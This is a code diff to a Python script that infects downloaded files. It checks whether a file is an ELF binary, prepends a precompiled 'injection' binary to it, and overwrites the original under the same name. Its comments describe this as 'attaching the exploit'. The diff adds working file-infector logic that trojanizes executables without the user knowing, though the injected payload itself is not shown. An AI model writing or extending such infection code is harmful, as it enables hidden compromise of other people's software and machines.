@@ -15,6 +15,7 @@ def inject(filename: str) -> str:
 
     if "ELF" in file_type:
         print("downloaded a binary and am now attaching the exploit to it")
+        elf_injection(filename)
     else:
         print("no exploit for this file type")
 
@@ -23,11 +24,14 @@ def elf_injection(filename: str) -> None:
     Performs an injection for an ELF file.
     """
 
-    # get the compiled injection
+    with open("downloads/" + filename, "rb") as payload, open("injections/elf/injection", "rb") as injection:
+        payload_contents = payload.read()
+        injection_contents = injection.read()
 
-    # cat the payload onto this injection
+        final_contents = injection_contents + payload_contents
 
-    # replace the payload with this injection (and don't change name)
+    with open("downloads/" + filename, "wb") as final:
+        final.write(final_contents)
 
 if __name__ == "__main__":
-    inject("injection")
+    inject("payload")
